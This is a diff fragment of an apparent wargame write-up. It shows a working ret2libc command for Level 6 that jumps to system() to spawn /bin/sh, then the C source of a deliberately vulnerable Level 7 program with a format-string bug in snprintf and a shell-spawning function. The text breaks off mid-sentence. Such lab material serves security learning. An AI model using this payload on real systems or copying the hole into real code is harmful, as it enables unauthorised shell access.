@@ -355,4 +355,52 @@ $7 = (<text variable, no debug info> *) 0xf7e62e70 <system>
 r `perl -e 'print "A"x8 . "\x70\x2e\xe6\xf7" . " ". "B"x8 . "/bin/sh"'`
 And it worked!
 #Level7
+```
+int goodfunction();
+int hackedfunction();
 
+int vuln(const char *format){
+        char buffer[128];
+        int (*ptrf)();
+
+        memset(buffer, 0, sizeof(buffer));
+        printf("goodfunction() = %p\n", goodfunction);
+        printf("hackedfunction() = %p\n\n", hackedfunction);
+
+        ptrf = goodfunction;
+        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);
+
+        printf("I guess you want to come to the hackedfunction...\n");
+        sleep(2);
+        ptrf = goodfunction;
+  
+        snprintf(buffer, sizeof buffer, format);
+
+        return ptrf();
+}
+
+int main(int argc, char **argv){
+        if (argc <= 1){
+                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
+                exit(-1);
+        }
+        exit(vuln(argv[1]));
+}
+
+int goodfunction(){
+        printf("Welcome to the goodfunction, but i said the
+Hackedfunction..\n");
+        fflush(stdout);
+        
+        return 0;
+}
+
+int hackedfunction(){
+        printf("Way to go!!!!");
+    fflush(stdout);
+        system("/bin/sh");
+
+        return 0;
+}
+```
+Ok so this program 
